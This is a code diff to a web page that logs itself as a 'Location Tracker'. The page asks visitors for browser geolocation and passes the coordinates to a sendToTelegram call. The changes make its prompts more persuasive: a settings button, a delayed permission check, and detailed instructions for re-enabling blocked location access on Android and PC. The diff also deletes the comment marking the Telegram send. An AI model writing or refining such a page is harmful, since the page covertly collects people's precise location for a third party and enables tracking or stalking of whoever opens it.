@@ -93,23 +93,9 @@
       display: none;
     }
 
-    #permission-status.success {
-      display: block;
-      background: #d4edda;
-      color: #155724;
-    }
-
-    #permission-status.error {
-      display: block;
-      background: #f8d7da;
-      color: #721c24;
-    }
-
-    #permission-status.info {
-      display: block;
-      background: #cce5ff;
-      color: #004085;
-    }
+    #permission-status.success { display: block; background: #d4edda; color: #155724; }
+    #permission-status.error { display: block; background: #f8d7da; color: #721c24; }
+    #permission-status.info { display: block; background: #cce5ff; color: #004085; }
 
     .retry-btn {
       background: #dc3545;
@@ -125,6 +111,22 @@
     }
 
     .retry-btn:hover { background: #c82333; }
+
+    .settings-btn {
+      background: #0d6e4b;
+      color: #fff;
+      border: none;
+      padding: 8px 20px;
+      border-radius: 30px;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 10px;
+      margin-left: 8px;
+      transition: 0.2s;
+    }
+
+    .settings-btn:hover { background: #0a5640; }
 
     @media (max-width: 480px) {
       .card { padding: 22px 16px 28px; }
@@ -163,11 +165,11 @@
   const statusDiv = document.getElementById('permission-status');
 
   // =============================================
-  // 🚀 CHECK PERMISSION STATUS ON LOAD
+  // 📍 CHECK PERMISSION STATUS
   // =============================================
   function checkPermissionStatus() {
     if (!navigator.permissions) {
-      showStatus('ℹ️ Permission API not supported. Click button to request.', 'info');
+      showStatus('ℹ️ Click the button to allow location access.', 'info');
       return;
     }
 
@@ -175,16 +177,23 @@
       .then((result) => {
         if (result.state === 'granted') {
           showStatus('✅ Location permission already granted!', 'success');
+          btn.disabled = false;
+          btn.textContent = '📍 Get My Location';
         } else if (result.state === 'denied') {
           showStatus('❌ Location permission blocked. Please enable in browser settings.', 'error');
-          btn.textContent = '🔒 Permission Blocked';
           btn.disabled = true;
+          btn.textContent = '🔒 Permission Blocked';
+          showSettingsButton();
         } else {
           showStatus('ℹ️ Click the button to allow location access.', 'info');
+          btn.disabled = false;
+          btn.textContent = '📍 Get My Location';
         }
       })
       .catch(() => {
-        // Permission API not supported
+        // Permission API not supported - try anyway
+        btn.disabled = false;
+        btn.textContent = '📍 Get My Location';
       });
   }
 
@@ -239,7 +248,6 @@ ${mapsLink}
   // 📍 GET LOCATION
   // =============================================
   function getLocation() {
-    // Clear previous
     resultDiv.style.display = 'none';
     resultDiv.className = '';
     statusDiv.style.display = 'none';
@@ -261,7 +269,6 @@ ${mapsLink}
         const lon = position.coords.longitude;
         const accuracy = position.coords.accuracy;
 
-        // Show result
         resultDiv.style.display = 'block';
         resultDiv.className = '';
         resultDiv.innerHTML = `
@@ -276,8 +283,6 @@ ${mapsLink}
         `;
 
         showStatus('✅ Location captured successfully!', 'success');
-
-        // Send to Telegram
         await sendToTelegram(lat, lon);
 
         btn.disabled = false;
@@ -289,14 +294,13 @@ ${mapsLink}
         if (error.code === 1) {
           msg = '❌ Permission denied. Please allow location access in your browser settings.';
           showStatus(msg, 'error');
-          // Show retry button
           resultDiv.style.display = 'block';
           resultDiv.className = 'error';
           resultDiv.innerHTML = `
             <span style="font-weight:600;">${msg}</span>
             <br><br>
-            <button class="retry-btn" onclick="openSettings()">⚙️ Open Settings</button>
-            <button class="retry-btn" style="background:#0d6e4b; margin-left:8px;" onclick="getLocation()">🔄 Retry</button>
+            <button class="retry-btn" onclick="getLocation()">🔄 Retry</button>
+            <button class="settings-btn" onclick="openSettings()">⚙️ Open Settings</button>
           `;
         } else if (error.code === 2) {
           msg = '❌ Location unavailable. Please check your GPS.';
@@ -317,17 +321,44 @@ ${mapsLink}
   }
 
   // =============================================
-  // ⚙️ OPEN SETTINGS (Android Browser)
+  // ⚙️ OPEN SETTINGS
   // =============================================
   function openSettings() {
-    // For Android Chrome
     if (navigator.userAgent.includes('Android')) {
-      window.location.href = 'app-settings:';
+      try {
+        window.location.href = 'app-settings:';
+      } catch(e) {
+        showManualInstructions();
+      }
+    } else {
+      showManualInstructions();
     }
-    // Try to open browser settings
-    alert('Please enable Location permission in your browser settings:\n\n' +
-          'Chrome: Settings → Site Settings → Location → Allow\n' +
-          'Firefox: Settings → Privacy & Security → Location → Allow');
+  }
+
+  function showManualInstructions() {
+    alert('Please enable Location in your browser settings:\n\n' +
+          '📱 ANDROID (Chrome):\n' +
+          'Settings → Apps → Chrome → Permissions → Location → Allow\n\n' +
+          '📱 ANDROID (Samsung):\n' +
+          'Settings → Apps → Samsung Internet → Permissions → Location → Allow\n\n' +
+          '🖥️ PC (Chrome):\n' +
+          'chrome://settings/content/location → Allow\n\n' +
+          '🖥️ PC (Firefox):\n' +
+          'about:preferences#privacy → Location → Settings → Allow');
+  }
+
+  // =============================================
+  // 📌 SHOW SETTINGS BUTTON
+  // =============================================
+  function showSettingsButton() {
+    resultDiv.style.display = 'block';
+    resultDiv.className = 'error';
+    resultDiv.innerHTML = `
+      <span style="font-weight:600;">❌ Location permission blocked. Please enable in browser settings.</span>
+      <br><br>
+      <button class="settings-btn" onclick="openSettings()">⚙️ Open Settings</button>
+      <button class="retry-btn" style="background:#0d6e4b; margin-left:8px;" onclick="checkPermissionStatus()">🔄 Check Again</button>
+    `;
   }
 
   // =============================================
@@ -347,7 +378,9 @@ ${mapsLink}
   // =============================================
   // 🚀 CHECK PERMISSION ON LOAD
   // =============================================
-  checkPermissionStatus();
+  window.addEventListener('DOMContentLoaded', () => {
+    setTimeout(checkPermissionStatus, 500);
+  });
 
   console.log('✅ Location Tracker Loaded');
 </script>
